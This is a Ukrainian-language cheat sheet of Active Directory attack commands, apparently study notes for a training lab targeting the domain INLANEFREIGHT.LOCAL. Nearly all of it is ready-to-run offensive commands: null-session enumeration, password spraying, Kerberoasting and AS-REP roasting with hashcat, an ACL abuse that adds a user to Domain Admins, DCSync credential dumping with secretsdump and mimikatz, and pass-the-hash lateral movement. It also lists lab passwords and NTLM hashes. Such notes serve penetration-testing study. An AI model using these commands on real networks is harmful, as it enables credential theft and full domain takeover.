AD Enumeration & Attacks – Beyond this Module
Основні команди й мінімальні пояснення. Орієнтовано на роботу з Parrot + домен INLANEFREIGHT.LOCAL.

1. Первинна енумація домену з Linux
bash
# Скан мережі
sudo nmap -v -A -Pn 172.16.5.0/24 -oN host-enum
Шукаємо DC (LDAP/Kerberos/SMB), файло‑сервери, SQL, інші служби.
​

bash
# Перевірка живих хостів
fping -asgq 172.16.5.0/24
Швидкий ping‑sweep усередині підмережі.
​

2. SMB NULL‑сесії та політики паролів
bash
# Null‑сесія до DC для основної інформації
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
rpcclient $> enumdomusers
Якщо NULL‑сесії дозволені, можна витягнути базову доменну інфу й RID’и.
​

bash
# Політика паролів через rpcclient
rpcclient $> getdompwinfo
Мінімальна довжина, термін дії, lockout, тощо.
​

bash
# Політика через enum4linux
enum4linux -P 172.16.5.5
Те ж саме, але в напівавтоматичному режимі.
​

3. Password Spraying
bash
# Політика паролів/юзери через CrackMapExec
crackmapexec smb 172.16.5.5 -u user.txt -p 'Password123' --no-bruteforce
Виконує одиночний логін на кожного користувача з файлу, не лочить акаунти.
​

bash
# Kerbrute password spray (Kerberos)
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validusers.txt 'Welcome1'
Шукаємо валідні кред для подальшого руху.
​

4. Credentialed Enumeration (Linux інструменти)
Припустимо, що валідні кред є: forend / Klmcargo2.
​

bash
# Список користувачів
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
bash
# Групи
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
bash
# Шари
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
Дає нам розуміння, де можуть лежати конфіги, резервні копії, скрипти.
​

bash
# Вхід на машину через psexec / wmiexec
psexec.py INLANEFREIGHT.LOCAL/forend:Klmcargo2@172.16.5.125
wmiexec.py INLANEFREIGHT.LOCAL/forend:Klmcargo2@172.16.5.5
Інтерактивний cmd на цільовому хості з правами облікового запису.
​

5. PowerView – доменна енумація з Windows
На хості з PowerShell (RDP/evil‑winrm):

powershell
# Імпорт PowerView
Import-Module .\PowerView.ps1
powershell
# Інформація про домен
Get-Domain
Get-DomainController
powershell
# Користувачі / групи
Get-DomainUser
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Базова доменна топологія, членство привілейованих груп.
​

powershell
# Політика домену
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Паролі, Kerberos, lockout’и.
​

6. Kerberoasting (Impacket)
bash
# Перелік SPN‑юзерів
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday
bash
# Запит TGS для всіх SPN і вивід у файл
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request -outputfile tgs.dump
bash
# Crack TGS hash із rockyou
hashcat -m 13100 tgs.dump /usr/share/wordlists/rockyou.txt --force
Якщо пароль слабкий — отримуємо кред сервісного юзера (часто з підвищеними правами).

7. Kerberoasting (PowerView / Rubeus)
На Windows‑хості:

powershell
# Знайти юзерів зі SPN
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
powershell
# Зібрати всі квитки у форматі Hashcat
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Out-File .\tgs_hashes.txt
bash
# Crack
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force
Або Rubeus:

powershell
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
Генерує список SPN з admincount=1 (зазвичай адмінські акаунти), відразу в зручному для crack форматі.
​

8. AS‑REP Roasting
powershell
# Пошук акаунтів без preauth
Get-DomainUser -PreauthNotRequired | Select samaccountname,userprincipalname
powershell
# AS‑REP Roasting через Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
Дає паролі акаунтів з DONT_REQ_PREAUTH.

9. ACL‑атаки (GenericAll/WriteDacl/AllExtendedRights)
powershell
# Пошук цікавих ACL по всьому домену
Find-InterestingDomainAcl
powershell
# Права над конкретною групою (напр. Domain Admins)
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
powershell
# Перевірити, хто має GenericAll
$acl = Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
$acl | ? { $_.ActiveDirectoryRights -eq 'GenericAll' }
powershell
# SID → ім’я
Convert-SidToName "S-1-5-21-...-RID"
Якщо користувач має GenericAll над групою:

powershell
net group "Domain Admins" <username> /add /domain
10. DCSync атака (Impacket та Mimikatz)
З Linux (маємо DA‑креди):

bash
# DCSync через secretsdump.py
secretsdump.py INLANEFREIGHT.LOCAL/CT059:'charlie1'@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -just-dc-user INLANEFREIGHT.LOCAL/administrator
Виводить NTLM‑хеші обраних облікових записів.

З Windows (mimikatz):

text
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt
Повертає NTLM‑хеш KRBTGT (7eba70412d81c1cd030d72a3e8dbe05f у твоїй лабораторії).
​

11. Lateral Movement – psexec / wmiexec / evil‑winrm
bash
# PTH до будь‑якого хоста (локальний адм хеш)
psexec.py administrator@MS01.inlanefreight.local -hashes aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99
bash
# WinRM (якщо увімкнено)
evil-winrm -i 172.16.7.50 -u CT059 -p charlie1
powershell
# PSSession до DC
$cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\CT059",(ConvertTo-SecureString "charlie1" -AsPlainText -Force))
Enter-PSSession -ComputerName DC01 -Credential $cred
12. Типові місця флагів / доказів
powershell
# Флаг локального адміністратора
more C:\Users\Administrator\Desktop\flag.txt
powershell
# Перевірка груп, в які потрапили
whoami
whoami /groups
net group "Domain Admins" /domain
